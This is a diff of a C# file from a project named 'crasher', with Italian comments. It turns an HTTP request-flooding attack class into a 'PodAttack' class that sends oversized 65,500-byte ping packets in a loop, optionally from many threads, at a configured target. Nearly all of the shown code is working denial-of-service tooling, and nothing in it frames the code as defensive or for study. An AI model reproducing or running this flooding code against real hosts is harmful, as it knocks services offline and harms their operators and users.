@@ -1,34 +1,28 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.IO;
 using System.Linq;
-using System.Linq.Expressions;
-using System.Net;
-using System.Net.Http;
-using System.Runtime.Serialization;
+using System.Net.NetworkInformation;
+using System.Security.Policy;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using crasher.Model;
-using WebException = System.Net.WebException;
 
 namespace crasher.Attacks
 {
-    public static class ClientRequest
+    
+    public class PodAttack
     {
-        private static WebClient client;
         private static Thread[] threads;
         private static bool stopFlag = false;
         private static Uri Url;
         private static bool ThreadsStarted = false;
-        /**
-         * Metodo che starta l'attacco, tipo di attacco a seconda del flag "threading" in AttackSettings.cs
-         * **/
+        private static int packetSize = 65500;
+
         public static void Start()
         {
             Console.Clear();
             Url = new Uri(AttackSettings.Url);
-            client = new WebClient();
 
             Console.WriteLine("Threading mode: " + AttackSettings.Threading);
             if (AttackSettings.Threading)
@@ -71,17 +65,16 @@ namespace crasher.Attacks
                 if (ThreadsStarted || !AttackSettings.Threading)
                 {
                     bool requestStatus = false;
-                    Byte[] packet = Helpers.NetHelper.RandomFillPackets(AttackSettings.PacketSize);
-                    
-                    //WebResponse response = SendData(Url,packet,out requestStatus);
-                    SendRequest(Url,out requestStatus);
+
+                    SendPing(Url, out requestStatus);
+
                     if (requestStatus)
                     {
-                        Console.WriteLine("OK");
+                        Console.WriteLine("Ping done");
                     }
                     else
                     {
-                        Console.WriteLine("Request failed..");
+                        Console.WriteLine("Ping failed..");
                     }
                 }
                 else if (!ThreadsStarted)
@@ -90,10 +83,12 @@ namespace crasher.Attacks
                 }
             }
         }
+
         /**
          * Ferma l'attacco a seconda del tipo utilizzato
          * **/
-        public static void Stop() {
+        public static void Stop()
+        {
             if (AttackSettings.Threading)
                 StopAsyncAttack();
             else
@@ -111,23 +106,28 @@ namespace crasher.Attacks
         /**
         * Esegue l'abort su tutti i thread.
         * **/
-        private static void StopAsyncAttack() {
-            foreach (Thread thread in threads) {
+        private static void StopAsyncAttack()
+        {
+            foreach (Thread thread in threads)
+            {
                 thread.Abort("Stopped attack by user");
             }
         }
 
-        public static void SendRequest(Uri url, out bool status)
+
+        public static void SendPing(Uri url, out bool status)
         {
-            WebClient client = new WebClient();
-            string response = null;
+            Ping client = new Ping();
             try
             {
-                client.DownloadStringAsync(Url);
+                Byte[] packet = new byte[packetSize];
+                int timeout = 10;
+                client.SendPingAsync(Url.ToString(),timeout,packet);
+
             }
-            catch (WebException we)
+            catch (PingException pe)
             {
-                Console.WriteLine("ERROR: " + we.Message);
+                Console.WriteLine("ERROR: " + pe.Message);
                 status = false;
                 return;
             }
@@ -137,43 +137,6 @@ namespace crasher.Attacks
             }
 
             status = true;
-        }
-
-        public static WebResponse SendData(Uri url, byte[] data, out bool status)
-        {
-            WebRequest request = WebRequest.Create(url);
-            request.Method = "POST";
-
-            byte[] byteArray = data;
-            request.ContentType = "application/x-www-form-urlencoded";
-            request.ContentLength = byteArray.Length;
-
-            try
-            {
-                Stream dataStream = request.GetRequestStream();
-                // Write the data to the request stream.  
-                dataStream.Write(byteArray, 0, byteArray.Length);
-                // Close the Stream object.  
-                dataStream.Close();
-            }
-            catch (WebException we)
-            {
-                status = false;
-                return null;
-            }
-
-
-            //SOME SITES DO HTTP ERROR CODE 500
-            status = true;
-            try
-            {
-                return request.GetResponse();
-
-            }
-            catch (WebException ex)
-            {
-                return null;
-            }
         }
     }
 }
